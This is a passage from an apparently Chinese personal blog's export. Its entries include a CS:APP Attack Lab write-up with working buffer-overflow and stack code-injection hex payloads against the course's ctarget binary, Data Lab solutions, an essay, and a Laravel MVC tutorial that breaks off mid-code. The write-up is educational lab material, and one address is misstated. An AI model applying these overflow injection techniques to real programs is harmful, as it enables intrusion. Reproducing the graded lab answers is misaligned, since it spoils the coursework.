<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  4017ac:  48 89 e7               mov    %rsp,%rdi</span><br><span class="line">  4017af:  e8 ac 03 00 00         callq  401b60 &lt;Gets&gt;</span><br><span class="line">  4017b4:  b8 01 00 00 00         mov    $0x1,%eax</span><br><span class="line">  4017b9:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  4017bd:  c3                     retq   </span><br><span class="line">  4017be:  90                     nop</span><br><span class="line">  4017bf:  90                     nop</span><br></pre></td></tr></table></figure>

<p>从这里我们可以观察到<code>getbuf</code>函数首先执行了将rsp寄存器减去0x28这个操作，即将栈顶指针向下移40个比特位，因此我们可以推断出<code>BUFFER_SIZE</code>的大小为40。</p>
<p>之后我们可以同样使用这种方法搜索touch1函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017c4:  c7 05 0e 3d 20 00 01   movl   $0x1,0x203d0e(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:  00 00 00 </span><br><span class="line">  4017ce:  bf e5 31 40 00         mov    $0x4031e5,%edi</span><br><span class="line">  4017d3:  e8 e8 f4 ff ff         callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  4017dd:  e8 cb 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  4017e2:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  4017e7:  e8 54 f6 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>



<p>在该段汇编代码中，我们同样可以看出touch1函数的地址为0x4017c0。</p>
<p>因此编写输入数据就简单了。</p>
<p>首先打开一个文件写入数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim touch1.txt</span><br></pre></td></tr></table></figure>

<p>编辑文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br></pre></td></tr></table></figure>

<p>前40位可以任意填充，在40位后即为缓存区溢出位，这里压入的是函数返回地址，因此将<code>touch1</code>函数的地址写入即可在<code>ret</code>之后返回至<code>touch1</code>函数并执行。</p>
<p>最终我们使用hex2raw工具执行代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat touch1.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>

<p>最终运行结果如下：</p>
<p><img src="/2020/04/02/1/level1.png" alt></p>
<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2:"></a>Level2:</h2><h3 id="目标：执行函数touch2-并传入cookie的值作为参数val"><a href="#目标：执行函数touch2-并传入cookie的值作为参数val" class="headerlink" title="目标：执行函数touch2,并传入cookie的值作为参数val"></a>目标：执行函数touch2,并传入cookie的值作为参数val</h3><p>同样，在本题中也给出了<code>touch2</code>的函数实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过在反汇编中寻找<code>touch2</code>代码，我们发现<code>touch2</code>的汇编语言如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  4017f0:  89 fa                  mov    %edi,%edx</span><br><span class="line">  4017f2:  c7 05 e0 3c 20 00 02   movl   $0x2,0x203ce0(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:  00 00 00 </span><br><span class="line">  4017fc:  3b 3d e2 3c 20 00      cmp    0x203ce2(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401802:  75 20                  jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:  be 08 32 40 00         mov    $0x403208,%esi</span><br><span class="line">  401809:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40180e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401813:  e8 d8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40181d:  e8 8b 05 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  401822:  eb 1e                  jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:  be 30 32 40 00         mov    $0x403230,%esi</span><br><span class="line">  401829:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40182e:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  401833:  e8 b8 f5 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:  bf 02 00 00 00         mov    $0x2,%edi</span><br><span class="line">  40183d:  e8 2d 06 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  401842:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401847:  e8 f4 f5 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>同样，我们找到了<code>touch2</code>函数的地址为<code>0x4017</code>。</p>
<p>由于本题需要在<code>touch2</code>中传入<code>cookie</code>参数才能执行成功，因此我们需要在输入文件中注入代码，并且将函数返回地址修改为代码注入的地址以实现代码注入攻击，因此我们需要知道<code>getbuf</code>函数栈顶地址（因为在此处我们需要注入代码）。</p>
<p>使用GDB调试一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line"></span><br><span class="line">(gdb) set args -q</span><br><span class="line"></span><br><span class="line">(gdb) b getbuf</span><br><span class="line"></span><br><span class="line">(gdb) r </span><br><span class="line"></span><br><span class="line">(gdb) ni </span><br><span class="line"></span><br><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>

<p>在命令行中我们调试ctarget程序并且在getbuf函数上打断点，在<code>getbuf</code>执行一步过后，即<code>sub $0x28 ,%rsp</code>之后我们查看<code>$rsp</code>寄存器的值，输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>

<p>接下来我们使用vim编辑注入汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi</span><br><span class="line">push   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>然后将汇编代码后编译后再进行反编译以获取机器代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c touch2.s</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d touch2.o</span><br></pre></td></tr></table></figure>

<p>然后可以获取<code>touch2</code>的机器级代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 </span><br><span class="line"></span><br><span class="line">68 ec 17 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>

<p>基于以上的信息我们就可以编辑输入文件了！</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>在栈顶进行代码注入，同时在溢出去返回栈顶地址。</p>
<p>使用<code>hex2raw</code>进行输入。</p>
<p>结果如下：</p>
<p><img src="/2020/04/02/1/level2.png" alt></p>
<h2 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h2><h3 id="目标：执行函数touch3，并传入cookie的值的字符串作为参数sval"><a href="#目标：执行函数touch3，并传入cookie的值的字符串作为参数sval" class="headerlink" title="目标：执行函数touch3，并传入cookie的值的字符串作为参数sval"></a>目标：执行函数touch3，并传入cookie的值的字符串作为参数sval</h3><p>与level2类似，区别在于我们这次需要构造一个字符串，而不是直接传一个整数，需要注意字符串保存位置。</p>
<p>讲义给出了<code>hexmatch</code>和<code>touch3</code>的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见需要传入表示 <code>cookie</code> 的值的字符串作为参数 <code>sval</code>。同时函数 <code>hexmatch</code> 的设计使得直接获取用于检验的字符串较为困难，因此我们需要自行构造这个字符串。</p>
<p>因此我们需要查看touch3的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:  53                     push   %rbx</span><br><span class="line">  4018fb:  48 89 fb               mov    %rdi,%rbx</span><br><span class="line">  4018fe:  c7 05 d4 3b 20 00 03   movl   $0x3,0x203bd4(%rip)        # 6054dc &lt;vlevel&gt;</span><br><span class="line">  401905:  00 00 00 </span><br><span class="line">  401908:  48 89 fe               mov    %rdi,%rsi</span><br><span class="line">  40190b:  8b 3d d3 3b 20 00      mov    0x203bd3(%rip),%edi        # 6054e4 &lt;cookie&gt;</span><br><span class="line">  401911:  e8 36 ff ff ff         callq  40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:  85 c0                  test   %eax,%eax</span><br><span class="line">  401918:  74 23                  je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  40191d:  be 58 32 40 00         mov    $0x403258,%esi</span><br><span class="line">  401922:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  401927:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40192c:  e8 bf f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401936:  e8 72 04 00 00         callq  401dad &lt;validate&gt;</span><br><span class="line">  40193b:  eb 21                  jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:  48 89 da               mov    %rbx,%rdx</span><br><span class="line">  401940:  be 80 32 40 00         mov    $0x403280,%esi</span><br><span class="line">  401945:  bf 01 00 00 00         mov    $0x1,%edi</span><br><span class="line">  40194a:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40194f:  e8 9c f4 ff ff         callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:  bf 03 00 00 00         mov    $0x3,%edi</span><br><span class="line">  401959:  e8 11 05 00 00         callq  401e6f &lt;fail&gt;</span><br><span class="line">  40195e:  bf 00 00 00 00         mov    $0x0,%edi</span><br><span class="line">  401963:  e8 d8 f4 ff ff         callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>

<p>touch3的汇编代码如上所示，了解到<code>touch3</code>的地址为<code>0x4018fa</code>，因此我们可以基于此地址构造注入代码。在写注入代码前我们还需要了解到<code>cookie</code>数值的字符串表示，以及该字符串在栈中存放位置。</p>
<p>其中cookie的字符串表示可以通过查询ASCII码表或者使用高级语言输出来获得。</p>
<p>关于字符串在栈中的存放位置，我们可以试想一下，如果将cookie字符串的编码放在返回地址下面的时候，当我们<code>return</code>至<code>touch3</code>所在函数时会进行数据的入栈，因此当从栈中地址取出字符串参数时，该字符串已经被破坏掉了，因此我们需要将cookie字符串放在return地址的上面，为了安全起见，我们将<code>cookie</code>的值设置为<code>%rsp+48</code>的位置。</p>
<p>接下来编辑汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x5561dca8,%rdi</span><br><span class="line">push $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>其中<code>0x5561dca8</code>这个地址是将栈顶指针加上48得到的。</p>
<p>之后，同level2一样，我们对注入代码进行汇编、反汇编获取机器码，这里不再赘述。</p>
<p>获取到的机器码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line"></span><br><span class="line">68 fa 18 40 00</span><br><span class="line"></span><br><span class="line">c3</span><br></pre></td></tr></table></figure>

<p>在之后我们就可以编写输入文件了。</p>
<p>输入文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8</span><br><span class="line">dc 61 55 68</span><br><span class="line">fa 18 40 00</span><br><span class="line">c3 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">78 dc 61 55</span><br><span class="line">00 00 00 00</span><br><span class="line">35 39 62 39</span><br><span class="line">39 37 66 61</span><br></pre></td></tr></table></figure>

<p>然后继续使用<code>hex2raw</code>工具进行输入。</p>
<p>输入结果如下：</p>
<p><img src="/2020/04/02/1/level3.png" alt></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>汇编</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>伴随岁月流逝的“严谨”</title>
    <url>/2020/03/27/1/</url>
    <content><![CDATA[<p>两周以前我看了《大赢家》这部电影，想写些东西，奈何太忙而被搁置了，现在我的感受已经只剩那么零零星星的一点了，但我依然想把它们记录下来。说实话，其实《大赢家》这部电影并不能算是好的电影，但是主人公的形象是十分特别的，因为他总能让我想起我年轻的时候（大概是我上小学的时候）。</p>
<a id="more"></a>

<p>那时的我简直和故事的主人公一模一样，倒不是说做事严谨，就是对每件事情都很认真对待。举几个我到现在还记忆清晰的例子来说明一下。当时我上小学三年级，老师在前面写板书，让我们安静看书，可是不一会儿全班的同学就开始交头接耳，然后就喧嚷起来。于是我就忍不了了，当时我把老师的话看做圣旨，觉得那些不听老师话的都是坏孩子。然后我大喊了一声“别吵了！”，我的嗓门很大，我喊完以后全班就没一个人说话了，因为他们惊呆了，没有人会想到我敢干出这种事。可是结果怎么样呢？我被老师教训了，我不是班长，不是纪律委员，却越俎代庖地干了他们该干的事，结果我被训了，我认为我的出发点是好的，但是因为我这一行为遭到了几乎所有人的“不理解”与“偏见”，所以之后我就再也不干这种事了。</p>
<p>还有一件事是，在一次语文默写课文的时候，我发现我旁边的两位同学正在“作弊”，于是我就又忍不了了，我就告诉她们我要去老师那里告发她们，她们很慌张，于是拿出“火腿肠”来贿赂我，但是我没有接受（其实我是回族，接受了也不能吃），但是我忘记了为什么我最终也没有告发她们，也许当时我已经发现这种对待事情特别“较真”的态度其实不管放到哪个圈子里都是行不通的，因为他们其实并不把这叫做“认真”，而是叫做“情商低”、“爱较真”。</p>
<p>于是我也沦落到现在这样了，我也经常“作弊”，并且不再把这些看做什么了不得的事，因为我身边的人都是这么做的。但其实我内心是真的厌恶某些人、某些事情，但我不会这么勇敢地表达出来了。因为我害怕被那些人情世故所撕碎，被那些圈子所排斥。其实我更多地发现，我们每个人外面都披着一层“皇帝的新衣”，我们有一肚子的实话想对一些人讲出来，但我们不会讲。</p>
<p>因为恐惧……</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
        <tag>movie</tag>
      </tags>
  </entry>
  <entry>
    <title>Data Lab</title>
    <url>/2020/03/10/1/</url>
    <content><![CDATA[<h2 id="isAsciiDight"><a href="#isAsciiDight" class="headerlink" title="isAsciiDight"></a>isAsciiDight</h2><h3 id="Dsecription"><a href="#Dsecription" class="headerlink" title="Dsecription:"></a>Dsecription:</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code:"></a>Source code:</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> judge1=!((x+<span class="number">1</span>+(~<span class="number">0x30</span>))&gt;&gt;<span class="number">31</span>);</span><br><span class="line">    <span class="keyword">int</span> judge2=!((<span class="number">0x39</span>+(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>);</span><br><span class="line">    <span class="keyword">return</span> judge1&amp;judge2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Thought"><a href="#Thought" class="headerlink" title="Thought:"></a>Thought:</h3><p>判断给定数字是否在0x30到0x39之间，只需判断给定数字与0x30与0x39比较大小即可，在位级运算中，正数x的相反数为对x取反并加1,所以判断0x30与该数的大小关系大小只需判断x+1+（~0x30）即可，然后将其右移31位取！，如果满足该数大于0x30条件的话，这部分会得到1，下一个与0x39比较同理，然后两个结果去做与运算即可得到结果。</p>
<a id="more"></a>

<h2 id="anyEvenBit"><a href="#anyEvenBit" class="headerlink" title="anyEvenBit"></a>anyEvenBit</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * anyEvenBit - return 1 if any even-numbered bit in word set to 1</span></span><br><span class="line"><span class="comment"> *   Examples anyEvenBit(0xA) = 0, anyEvenBit(0xE) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code:"></a>Source Code:</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anyEvenBit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">0x55</span>;</span><br><span class="line">    <span class="keyword">int</span> temp=(t&lt;&lt;<span class="number">8</span>) | t;</span><br><span class="line">    <span class="keyword">int</span> mask = (temp&lt;&lt;<span class="number">16</span>) | temp;</span><br><span class="line">    <span class="keyword">return</span> !!(mask&amp;x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Thought-1"><a href="#Thought-1" class="headerlink" title="Thought:"></a>Thought:</h3><p>构造一个偶数位全为1，奇数位全为0的数，与目标数按位与运算，并取两次非（因为当偶数位为1时返回值为大于1的整数）。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>从Laravel框架浅谈MVC架构</title>
    <url>/2020/03/07/1/</url>
    <content><![CDATA[<p>  最近应工作室要求学习PHP框架Laravel，接触到了MVC软件架构模式,即Model-View-Controller，这里我将使用Laravel框架介绍MVC架构模式，并且阐述自己对MVC软件架构浅薄的理解。</p>
<p><img src="/2020/03/07/1/MVC.jpg" alt></p>
<a id="more"></a>

<h2 id="MVC架构简述："><a href="#MVC架构简述：" class="headerlink" title="MVC架构简述："></a>MVC架构简述：</h2><h4 id="由图所示，简单地理解MVC架构模式可以认为："><a href="#由图所示，简单地理解MVC架构模式可以认为：" class="headerlink" title="由图所示，简单地理解MVC架构模式可以认为："></a>由图所示，简单地理解MVC架构模式可以认为：</h4><p>1.View（视图）：是用户直接接触的界面，一般由前端处理，主要用来展示模型中的内容和用来输入表单数据。</p>
<p>2.Controller（控制器）：主要用于处理视图和模型之间的逻辑关系，例如从视图中post的数据，到底如何进入模型并存入数据库中，我们是否应该对于用户的数据进行过滤以防止SQL注入等问题，又或者从数据库中取出的数据哪些应该展示在视图上，有什么判断标准，都需要控制器进行判断。</p>
<p>3.Model（模型）：即底层同应用程序的接口，我们可以从Model中获取数据并进行处理。</p>
<p>以上是我对于MVC的一些理解，因为刚刚接触这种软件架构模式，所以理解不深，如果有兴趣者可以自行去深入了解。</p>
<h4 id="以下给出MVC的一些友情链接："><a href="#以下给出MVC的一些友情链接：" class="headerlink" title="以下给出MVC的一些友情链接："></a>以下给出MVC的一些友情链接：</h4><p><a href [https: en.wikipedia.org wiki model%e2%80%93view%e2%80%93controller]">维基百科</a></p>
<p><a href https: draveness.me mvx"">浅谈MVC、MVP和MVVM架构模式</a></p>
<h2 id="Laravel实例："><a href="#Laravel实例：" class="headerlink" title="Laravel实例："></a>Laravel实例：</h2><h4 id="接下来我将使用Laravel对于这一架构模式进行说明（Laravel只是媒介，这里不涉及Laravel语法细节）："><a href="#接下来我将使用Laravel对于这一架构模式进行说明（Laravel只是媒介，这里不涉及Laravel语法细节）：" class="headerlink" title="接下来我将使用Laravel对于这一架构模式进行说明（Laravel只是媒介，这里不涉及Laravel语法细节）："></a>接下来我将使用Laravel对于这一架构模式进行说明（Laravel只是媒介，这里不涉及Laravel语法细节）：</h4><p>假如说我们需要写一个登录界面那么我们使用MVC如何处理呢？</p>
<p>首先，我们需要一个登陆界面，这个登录界面是需要让用户看到的，并且在这个界面中，我们还需要让用户在登录界面中输入数据并且可以让控制器接收到，因此我们可以写html，php或者Laravel支持的blade模板，总之，不管使用哪种形式，最重要的是让用户有可视化界面并且实现登陆功能。</p>
<p>我用blade模板进行举例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@extends(&quot;common.layout&quot;)</span><br><span class="line">@section(&quot;title&quot;)</span><br><span class="line">    Login</span><br><span class="line">@stop</span><br><span class="line"></span><br><span class="line">@section(&quot;content&quot;)</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;xiao-container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;xiao-register-box&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;xiao-title-box&quot;&gt;</span><br><span class="line">                &lt;span&gt;登录&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;form action&#x3D;&quot;&#123;&#123;url(&#39;at&#x2F;save&#39;)&#125;&#125;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                &#123;&#123;csrf_field()&#125;&#125;</span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-username-box&quot;&gt;</span><br><span class="line">                    &lt;span class&#x3D;&quot;xiao-require&quot;&gt;*&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;label for&#x3D;&quot;account&quot;&gt;账户&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;xiao-username-input&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;account&quot; name&#x3D;&quot;account&quot; placeholder&#x3D;&quot;账户：&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;br&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-userPassword-box&quot;&gt;</span><br><span class="line">                    &lt;span class&#x3D;&quot;xiao-require&quot;&gt;*&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;label for&#x3D;&quot;password&quot;&gt;密码&lt;&#x2F;label&gt;</span><br><span class="line">                    &lt;div class&#x3D;&quot;xiao-userPassword-input&quot;&gt;</span><br><span class="line">                        &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;密码：&quot; &#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;xiao-submit-box&quot;&gt;</span><br><span class="line">                    &lt;input id &#x3D; &quot;xiao-submit-button&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;登录&quot;&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            @if ($errors-&gt;any())</span><br><span class="line">                &lt;div class&#x3D;&quot;alert alert-danger&quot;&gt;</span><br><span class="line">                    &lt;ul&gt;</span><br><span class="line">                        @foreach ($errors-&gt;all() as $error)</span><br><span class="line">                            &lt;li&gt;&#123;&#123; $error &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">                        @endforeach</span><br><span class="line">                    &lt;&#x2F;ul&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            @endif</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">@stop</span><br></pre></td></tr></table></figure>

<p>我们无需管语法细节，只需要注意，我们在这里设计了一个表单，并且将方法设置为post，因此可以使控制器接收到数据，那么相应地，我们也需要设置相应的路由与控制器方法（路由是用户访问url所必需的）</p>
<h4 id="路由："><a href="#路由：" class="headerlink" title="路由："></a>路由：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::any(<span class="string">'at/login'</span>,[<span class="string">'uses'</span> =&gt; <span class="string">'StudentController@login'</span>]);</span><br><span class="line">Route::any(<span class="string">'at/save'</span>,[<span class="string">"uses"</span> =&gt; <span class="string">"StudentController@save"</span>]);</span><br></pre></td></tr></table></figure>

<h4 id="控制器："><a href="#控制器：" class="headerlink" title="控制器："></a>控制器：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'student.login'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $validate= $request-&gt;validate(</span><br><span class="line">            [</span><br><span class="line">                <span class="string">"account"</span> =&gt; <span class="string">"required|string|max:20"</span>,</span><br><span class="line">                <span class="string">"password"</span> =&gt; <span 